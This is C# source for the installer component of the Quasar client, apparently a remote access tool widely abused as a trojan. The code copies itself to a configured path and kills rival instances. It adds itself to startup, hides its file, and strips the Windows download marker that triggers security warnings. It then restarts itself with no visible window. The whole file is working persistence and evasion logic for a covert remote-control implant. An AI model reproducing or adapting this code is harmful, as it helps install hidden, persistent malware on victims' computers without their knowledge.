using Quasar.Client.Config;
using Quasar.Common.Helpers;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Setup
{
    public class ClientInstaller
    {
        public void Install()
        {
            bool isKilled = false;

            // create target dir
            if (!Directory.Exists(Path.GetDirectoryName(Settings.INSTALLPATH)))
            {
                try
                {
                    Directory.CreateDirectory(Path.GetDirectoryName(Settings.INSTALLPATH));
                }
                catch (Exception)
                {
                    return;
                }
            }

            // delete existing file
            if (File.Exists(Settings.INSTALLPATH))
            {
                try
                {
                    File.Delete(Settings.INSTALLPATH);
                }
                catch (Exception ex)
                {
                    if (ex is IOException || ex is UnauthorizedAccessException)
                    {
                        // kill old process if new mutex
                        Process[] foundProcesses =
                            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Settings.INSTALLPATH));
                        int myPid = Process.GetCurrentProcess().Id;
                        foreach (var prc in foundProcesses)
                        {
                            if (prc.Id == myPid) continue;
                            prc.Kill();
                            isKilled = true;
                        }
                    }
                }
            }

            if (isKilled) Thread.Sleep(5000);

            //copy client to target dir
            try
            {
                File.Copy(Application.ExecutablePath, Settings.INSTALLPATH, true);
            }
            catch (Exception)
            {
                return;
            }

            if (Settings.STARTUP)
            {
                Startup.AddToStartup();
            }

            if (Settings.HIDEFILE)
            {
                try
                {
                    File.SetAttributes(Settings.INSTALLPATH, FileAttributes.Hidden);
                }
                catch (Exception)
                {
                }
            }

            FileHelper.DeleteZoneIdentifier(Settings.INSTALLPATH);

            //start file
            var startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                FileName = Settings.INSTALLPATH
            };
            try
            {
                Process.Start(startInfo);
            }
            catch (Exception)
            {
            }
        }
    }
}
